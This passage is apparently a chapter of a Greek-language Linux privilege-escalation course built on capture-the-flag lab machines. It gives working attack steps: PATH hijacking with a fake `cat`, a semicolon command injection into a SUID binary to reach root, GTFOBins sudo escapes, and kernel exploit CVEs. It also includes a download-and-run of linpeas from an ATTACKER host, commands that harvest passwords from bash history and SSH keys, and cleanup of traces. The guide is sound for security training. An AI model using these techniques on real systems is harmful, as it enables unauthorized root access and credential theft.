uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=1000(user)
```

**Τρία βήματα:** (1) κατάλογος που ελέγχετε **πρώτα** στο PATH, (2) εκτελέσιμο με **ακριβώς**
το ίδιο όνομα με τη σκέτη εντολή, (3) κλήση του προνομιακού προγράμματος.

**Προσοχές:**
- **`export PATH=/home/user/evil:$PATH`** — **ΠΡΟΣΘΕΤΕΙ** μπροστά. Το `$PATH` στο τέλος είναι
  υποχρεωτικό· αν το παραλείψετε, χάνετε όλες τις κανονικές εντολές.
- **Αποκαταστήστε μετά:** `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
  — αλλιώς **κάθε** επόμενη εντολή βρίσκει το ψεύτικο `service`.
- **Ελέγξτε το `secure_path` του sudo** και το `PATH=` του `/etc/crontab`: αν υπάρχουν, το
  δικό σας PATH **δεν μετράει** και η τεχνική δεν δουλεύει.

### 7.4 Η διδακτική στιγμή του Μηχανήματος 10

```text
mike@pwnlab:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

Εδώ το SUID binary `msgmike` ανήκει στον **`mike`**, όχι στον root. Άρα το PATH hijack σας δίνει
**mike**, όχι root — και πρέπει να συνεχίσετε με **δεύτερη** ευπάθεια (`msg2root`, SUID root, με
command injection). **Η αναβάθμιση είναι συχνά αλυσίδα, όχι ένα βήμα.**

---

## 8. Kernel exploits — η τελευταία επιλογή

### 8.1 Πότε τα εξετάζετε

**Μόνο αφού τα βήματα 1–7 έχουν εξαντληθεί.** Και μόνο αφού έχετε συγκρίνει την έκδοση kernel
με τις ημερομηνίες των CVE:

| Exploit | CVE | Έκδοση kernel | Μηχάνημα |
| --- | --- | --- | --- |
| **overlayfs** | CVE-2015-1328 | Ubuntu 3.13–3.19, 14.04/14.10 | 2 |
| **Dirty COW** | CVE-2016-5195 | < 4.8.3 (όλα τα Linux) | 2 (εναλλακτικά) |
| **PwnKit** | CVE-2021-4034 | polkit < 0.120 (όλα, 2009–2021) | — |
| **CVE-2021-3493** | — | Ubuntu 5.4.0-48 (focal) | — |
| **OpenFuck** | CVE-2002-0082 | mod_ssl 2.8.4 + OpenSSL 0.9.6b | 5 |

```bash
uname -r
searchsploit linux kernel 3.13
```

```text
3.13.0-32-generic
```
```text
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04) - 'overlayfs' LPE | linux/local/37292.c
```

### 8.2 Γιατί είναι τελευταία επιλογή

| Πρόβλημα | Συνέπεια |
| --- | --- |
| **Πρέπει να μεταγλωττιστεί** | Χρειάζεστε `gcc` **στον στόχο**, ή cross-compile και σωστές βιβλιοθήκες |
| **Μπορεί να ρίξει το μηχάνημα** | Kernel panic = **χάσατε το shell και το VM** → **πάντα snapshot πρώτα** |
| **Είναι version-specific** | Λάθος offset = crash |
| **Δεν διδάσκει μέθοδο** | Σε πραγματικό έργο η αναφορά λέει «ενημερώστε το kernel» — η τεχνική δεν μεταφέρεται |

**Αν το μηχάνημα δεν έχει `gcc`** (Μηχάνημα 13 — slim container), τα kernel exploits **είναι
εκτός παιχνιδιού**, και αυτό είναι υπόδειξη ότι η intended διαδρομή είναι άλλη (εκεί: διαφυγή
από container).

### 8.3 Ο αυτοματοποιημένος έλεγχος

```bash
wget http://ATTACKER:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a | tee linpeas.txt
```

Το **linpeas** ελέγχει **τα πάντα** — SUID, capabilities, cron, PATH, containers, kernel,
ομάδες, εγγράψιμα αρχεία, ιστορικό, SSH keys, βάσεις δεδομένων — και **χρωματίζει** τα
ευρήματα:

| Χρώμα | Σημασία |
| --- | --- |
| **Κόκκινο/κίτρινο 99%** | **Σχεδόν σίγουρα εκμεταλλεύσιμο** |
| **Κόκκινο** | Υψηλή πιθανότητα |
| **Κίτρινο** | Αξίζει έλεγχο |
| Λευκό | Πληροφοριακό |

**Χρησιμοποιήστε το ως λίστα ελέγχου, όχι ως υποκατάστατο της κατανόησης.** Το `tee linpeas.txt`
σώζει την έξοδο — αλλιώς χάνεται όταν κλείσει το session.

---

## 9. Έλεγχος γνώσεων

<details>
<summary><b>1.</b> Ποια η διαφορά μεταξύ <code>uid=1002(robot)</code> και <code>euid=0(root)</code> στην ίδια γραμμή;</summary>

Το **πραγματικό** UID είναι ο λογαριασμός που σας ξεκίνησε (ο `robot`)· το **ενεργό** UID είναι
αυτό που **ο πυρήνας χρησιμοποιεί για κάθε έλεγχο πρόσβασης**. Με `euid=0` έχετε πλήρη
δικαιώματα root **χωρίς να αλλάξατε ταυτότητα**. Πρόκειται για **αναβάθμιση SUID**, όχι για
σύνδεση — και η διαφορά φαίνεται στο auditing, γιατί η αρχική ταυτότητα παραμένει καταγεγραμμένη.
</details>

<details>
<summary><b>2.</b> Βρίσκετε <code>(root) NOPASSWD: /usr/bin/git</code>. Τι κάνετε;</summary>

Αναζητώ το `git` στο **GTFOBins**. Η διαφυγή: `sudo git -p help config` — το `-p` στέλνει την
έξοδο σε **pager** (`less`), και η `less` υποστηρίζει **`!CMD`** που τρέχει κέλυφος. Επειδή η
`less` ξεκίνησε από μια root-owned `git` υπό `NOPASSWD`, **το κέλυφος είναι root**. Εναλλακτικά:
`sudo git help config` με `PAGER` ορισμένο.
</details>

<details>
<summary><b>3.</b> Γιατί το <code>getcap -r /</code> πρέπει να είναι στη λίστα ελέγχου σας, δίπλα στο SUID;</summary>

Επειδή τα **capabilities είναι διαφορετικός μηχανισμός** από το SUID: ένα αρχείο μπορεί να έχει
`cap_dac_read_search` **χωρίς κανένα SUID bit** (mode `-rwxr-xr-x`). Στο Μηχάνημα 8 η σάρωση
`find -perm -4000` **δεν βρήκε τίποτα** και το `getcap` βρήκε το root. Τα περισσότερα
baseline checks ελέγχουν SUID και **ξεχνούν εντελώς** τα capabilities.
</details>

<details>
<summary><b>4.</b> Γιατί το <code>-p</code> είναι υποχρεωτικό στο <code>/bin/sh -p</code> μετά από SUID;</summary>

Επειδή το bash **εσκεμμένα αφήνει το effective UID** στην εκκίνηση, εκτός αν κληθεί με `-p`
("privileged"). Είναι ρητή άμυνα ενάντια ακριβώς σε αυτή την επίθεση. Χωρίς `-p` παίρνετε
κέλυφος με το **δικό σας** UID, `$` αντί για `#`, και συμπεραίνετε λανθασμένα ότι η επίθεση
απέτυχε.
</details>

<details>
<summary><b>5.</b> Τι κάνει το <code>pspy</code> που δεν κάνει το <code>ps aux</code>;</summary>

Το `ps` δείχνει μόνο ό,τι τρέχει **εκείνη τη στιγμή**. Το `pspy` παρακολουθεί **inotify
events στο `/proc`** και καταγράφει **κάθε εκκίνηση και έξοδο** διεργασίας, με πλήρη γραμμή
εντολών και το UID — **χωρίς root**. Έτσι πιάνει βραχύβιες διεργασίες (που τρέχουν για
χιλιοστά) και χρονοπρογραμματισμένες εργασίες που **δεν εμφανίζονται σε κανένα crontab**.
</details>

<details>
<summary><b>6.</b> Βλέπετε <code>-rwxrwxrwx 1 root root 612 /opt/md5check.py</code> που τρέχει ως root κάθε 5 δευτερόλεπτα. Ποιοι κανόνες παραβιάστηκαν;</summary>

Mode **777** σε αρχείο κατόχου root που εκτελείται από root. Παραβιάζεται ο **πρώτος** από τους
τρεις κανόνες ασφαλείας μιας χρονοπρογραμματισμένης εργασίας: «το script που τρέχει δεν είναι
εγγράψιμο από χαμηλότερα προνόμια». Οι άλλοι δύο (μη εκτέλεση από τοποθεσία εγγράψιμη από
όλους, απόλυτες διαδρομές) εδώ **ικανοποιούνται** — το script χρησιμοποιεί `/usr/bin/python`
και απόλυτες διαδρομές — και γι' αυτό η επίθεση είναι **αντικατάσταση του αρχείου**, όχι PATH
hijack.
</details>

<details>
<summary><b>7.</b> Γιατί τα kernel exploits είναι η τελευταία επιλογή;</summary>

Χρειάζονται **μεταγλωττιστή στον στόχο**, είναι **ευαίσθητα στην ακριβή έκδοση**, και **μπορεί
να ρίξουν το μηχάνημα** (kernel panic = χάνετε shell και VM). Επιπλέον δεν διδάσκουν μέθοδο:
σε πραγματικό έργο η διόρθωση είναι «ενημερώστε το kernel», και η τεχνική δεν μεταφέρεται σε
άλλο μηχάνημα.
</details>

---

## 10. Σημειωμένες εντολές

### 10.1 `sudo -l` — τα τρία αποτελέσματα που βλέπετε στην πράξη

```bash
sudo -l
```

**Αποτέλεσμα Α — χωρίς δικαιώματα:**
```text
[sudo] password for www-data:
Sorry, try again.
```

**Αποτέλεσμα Β — χωρίς sudo:**
```text
bash: sudo: command not found
```
**Διαβάστε το σωστά:** δεν είναι «δεν έχω δικαιώματα», είναι **«το σύστημα δεν έχει καν το
πρόγραμμα»** — τυπικό σε slim containers (Μηχάνημα 13). Άρα ο μόνος δρόμος είναι SUID ή
capabilities.

**Αποτέλεσμα Γ — το θανατηφόρο:**
```text
User jerry may run the following commands on DC-2:
    (ALL : ALL) ALL
```
Διαβάστε το ως τέσσερα μέρη: **`ALL`** χρήστης-στόχος, **`ALL`** ομάδα-στόχος, **`ALL`**
εντολές. Χωρίς `NOPASSWD:` → **χρειάζεται κωδικός**. Άρα η εργασία σας είναι να βρείτε κωδικό,
όχι τεχνική.

### 10.2 `find` — όλοι οι τύποι αναζήτησης προνομίων

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
find / -perm /6000 -type f 2>/dev/null          # SUID Ή SGID
find / -writable -type d 2>/dev/null | head     # εγγράψιμοι κατάλογοι
find / -user root -perm -4000 -type f -newer /etc/os-release 2>/dev/null
find /etc -perm -o+w -type f 2>/dev/null        # world-writable ρυθμίσεις
```

| Όρος | Σημασία |
| --- | --- |
| `-perm -4000` | **Υποσύνολο**: έχει **τουλάχιστον** το SUID bit |
| `-perm 4000` | **Ακριβώς** 4000 — **θα χάσετε** αρχεία με άλλα δικαιώματα |
| `-perm /6000` | **Οποιοδήποτε** από τα bits (SUID **ή** SGID) |
| `-perm -u=s` | Συμβολική μορφή του `-perm -4000` |
| `-writable` | Ο **τρέχων χρήστης** μπορεί να γράψει |
| `-perm -o+w` | **Οποιοσδήποτε** (other) μπορεί να γράψει |
| `-newer FILE` | Νεότερο από αυτό το αρχείο |
| `2>/dev/null` | **Υποχρεωτικό** — αλλιώς χιλιάδες σφάλματα θάβουν το αποτέλεσμα |

**Η διαφορά `-perm -4000` / `-perm 4000` είναι παγίδα.** Ένα αρχείο με mode `4755` ταιριάζει
και στα δύο, αλλά ένα με `6755` (SUID+SGID) ταιριάζει **μόνο** στο `-perm -4000`.

### 10.3 `getcap` — ανάγνωση

```bash
getcap -r / 2>/dev/null
getcap /home/cyber/tar
getcap -v /usr/bin/ping
```

```text
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

`-r` = αναδρομική · `-v` = εμφάνιση και των **μηδενικών** συνόλων. **Το `=ep` σημαίνει
effective + permitted** — δηλαδή το capability είναι **ενεργό αυτή τη στιγμή**. Αν δείτε `=p`
μόνο, είναι permitted αλλά όχι effective — πιο περιορισμένο.

### 10.4 `ps aux` — ανάγνωση στηλών

```bash
ps aux | grep -E 'root|UID' | head -20
```

```text
USER   PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root     1  0.0  0.1 168772 12032 ?    Ss   May04   0:03 /sbin/init
root   412  0.0  0.0  71204  5632 ?    Ss   May04   0:00 /usr/sbin/cron -f
root   455  0.0  0.2 227896 18432 ?    Ssl  May04   0:12 /usr/bin/python /opt/md5check.py
www-data 890 0.3 1.2 385120 24576 ?   S    10:02   0:11 /usr/sbin/apache2 -k start
```

| Στήλη | Τι ψάχνετε |
| --- | --- |
| **`USER`** | `root` = ενδιαφέρον · `www-data` = web |
| **`PID`** | Για `kill` |
| `%CPU` | **99%** = εξόρυξη κρυπτονομίσματος ή ενεργή εκμετάλλευση |
| `STAT` | **`Z`** = zombie (σπασμένη γονική διεργασία) · **`+`** = στο προσκήνιο |
| **`START`** | Πότε ξεκίνησε — κάτι που ξεκίνησε «May04» τρέχει μέρες |
| **`COMMAND`** | **Η πλήρης γραμμή εντολών** — εδώ κρύβεται η απάντηση |

**Η τρίτη γραμμή παραπάνω είναι εύρημα από μόνη της:** ένα Python script που τρέχει **ως root**
από τις 4 Μαΐου. Κοιτάξτε το `ls -l /opt/md5check.py` αμέσως.

### 10.5 Οι εντολές διάγνωσης που σώζουν ώρες

```bash
cat /etc/passwd | grep -vE 'nologin|false|sync|shutdown|halt' | cut -d: -f1,3,6,7
ls -la /home/*/
cat /home/*/.bash_history 2>/dev/null | grep -iE 'pass|ssh|mysql|su '
ls -la /root/.ssh/ /home/*/.ssh/ 2>/dev/null
cat /var/log/auth.log 2>/dev/null | tail -30
mount | grep -vE 'proc|sys|cgroup'
cat /proc/self/mounts | head
df -h
ls -la /opt /srv /var/www /media /mnt 2>/dev/null
```

**Τι βρίσκετε:**
- **`grep -vE 'nologin|false'`** — αφαιρεί τους λογαριασμούς υπηρεσιών, μένουν **οι πραγματικοί
  χρήστες** με όνομα, UID, home και shell.
- **`.bash_history`** — **χρυσωρυχείο.** Οι άνθρωποι πληκτρολογούν κωδικούς σε εντολές
  (`mysql -uroot -pMyPass`), ξεχνούν να καθαρίσουν, και συχνά κάνουν `history -c` **μόνο** για
  το δικό τους shell.
- **`/root/.ssh/`** — αν υπάρχει `id_rsa` **και είναι readable**, είναι άμεση πρόσβαση.
  Αν υπάρχει **`authorized_keys` εγγράψιμο**, προσθέστε το δικό σας δημόσιο κλειδί.
- **`mount`** — αναζητήστε **`nfs`**, **`cifs`**, ή προσαρτήσεις με `no_root_squash`.
- **`/opt`, `/srv`, `/media`, `/mnt`** — εκεί ζουν τα **προσαρμοσμένα** scripts, δηλαδή τα
  μη-stock SUID και τα cron scripts.

### 10.6 SUID chain — το Μηχάνημα 10 από την αρχή ως το τέλος

```bash
# Βήμα 1: βρες τα SUID
find / -perm -u=s -type f 2>/dev/null | grep -vE '^/(usr/bin/(chsh|newgrp|gpasswd|chfn|mount|su|umount|passwd)|usr/lib)'
# → /home/kane/msgmike

# Βήμα 2: δες τι καλεί
strings /home/kane/msgmike
# → cat /home/mike/msg.txt        ← σκέτο όνομα!

# Βήμα 3: φτιάξε ψεύτικο cat
cd /home/kane
printf '#!/bin/bash\n/bin/bash -i\n' > cat
chmod +x cat

# Βήμα 4: βάλε τον κατάλογό σου πρώτα
export PATH=/home/kane:$PATH

# Βήμα 5: τρέξε το προνομιακό πρόγραμμα
/home/kane/msgmike
id
```

```text
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

**Ανάγνωση:** το `msgmike` είναι SUID **του mike**, όχι του root. Άρα **αυτή η αλυσίδα δίνει
mike**. Στη συνέχεια, ως mike:

```bash
ls -la /home/mike
strings /home/mike/msg2root
```

```text
-rwsr-xr-x 1 root root 5364 Mar 17  2016 msg2root
```
```text
Message for root:
/bin/echo %s >> /root/messages.txt
```

**Το `%s` είναι η είσοδός σας, μέσα σε εντολή κελύφους, χωρίς παράθεση.** Άρα `;` τερματίζει το
`echo` και ξεκινά τη δική σας εντολή **ως root**:

```bash
/home/mike/msg2root
# στο prompt "Message for root:" → πληκτρολογήστε:  ;/bin/sh
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Δύο διαφορετικές ευπάθειες, δύο διαφορετικοί λογαριασμοί, μία αλυσίδα.** Κάθε SUID binary
αξίζει **δύο** ερωτήσεις: *τι εκτελεί;* (`strings`) και *περνάει είσοδο χρήστη σε κέλυφος;*

### 10.7 Ο πλήρης αυτοματοποιημένος έλεγχος

```bash
wget http://ATTACKER:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>/dev/null | tee linpeas.txt
grep -E '\x1b\[1;31m|\x1b\[1;33m' linpeas.txt | head -40
```

| Σημαία | Σημασία |
| --- | --- |
| `-a` | **Όλοι** οι έλεγχοι (ο προεπιλεγμένος παραλείπει μερικούς αργούς) |
| `-s` | Superfast — μόνο τα γρήγορα |
| `-P` | Χωρίς χρώματα (**απαραίτητο για grep**) |
| `-o` | Μόνο οι OS-checks |
| `2>/dev/null` | Απόκρυψη σφαλμάτων πρόσβασης |
| `tee linpeas.txt` | **Και στην οθόνη και σε αρχείο** — αλλιώς χάνεται με το session |

**Το `grep` με τους κωδικούς ANSI** (`\x1b[1;31m` = έντονο κόκκινο, `\x1b[1;33m` = έντονο
κίτρινο) φιλτράρει **μόνο τα χρωματισμένα ευρήματα** — δηλαδή αυτά που το linpeas θεωρεί
σημαντικά. Χωρίς αυτό, ψάχνετε σε 5.000 γραμμές.

**Εναλλακτικά:** `unix-privesc-check`, `linux-smart-enumeration` (`lse.sh`),
`linuxprivchecker.py`. **Κανένα δεν υποκαθιστά την κατανόηση** — αλλά όλα πιάνουν πράγματα που
ξεχνάτε στις 3 το πρωί.

### 10.8 Απόκτηση root και επαλήθευση

```bash
id
whoami
cat /root/*.txt /root/proof.txt /root/flag.txt 2>/dev/null
hostname
ls -la /root/
```

```text
uid=0(root) gid=0(root) groups=0(root)
root
hackinos
```

**Τέσσερις έλεγχοι, γιατί κανένας από μόνος του δεν αρκεί:**
- **`id`** — το μόνο που δείχνει **πραγματικό** και **ενεργό** UID ξεχωριστά.
- **`whoami`** — **μπορεί να σας ξεγελάσει** σε SUID αναβάθμιση (τυπώνει τον πραγματικό χρήστη).
- **`cat /root/…`** — **η λειτουργική απόδειξη**: αν διαβάζετε το root directory, είστε root.
- **`hostname`** — **στο Μηχάνημα 13 διακρίνει container από οικοδεσπότη**: 12 δεκαεξαδικοί =
  container· πραγματικό όνομα = ξεφύγατε.

**Και μετά: καθαρισμός.**

```bash
find / -newer /etc/hostname -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
rm -f /tmp/rb /tmp/*.c /tmp/*.sh /home/*/evil
cp /tmp/md5check.py.bak /opt/md5check.py
kill %1 2>/dev/null
```

Το `-newer /etc/hostname` βρίσκει **όλα τα αρχεία που δημιουργήσατε** από την εκκίνηση και μετά
— είναι ο πιο γρήγορος τρόπος να ελέγξετε τι αφήσατε πίσω.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](README.md) · προηγούμενο: [04 — Διαπιστευτήρια και Σπασίματα](<04-Διαπιστευτήρια-και-Σπασίματα.md>) · επόμενο: [06 — Κελύφη, Εμμονή και Διαφυγές](<06-Κελύφη-Εμμονή-και-Διαφυγές.md>)_
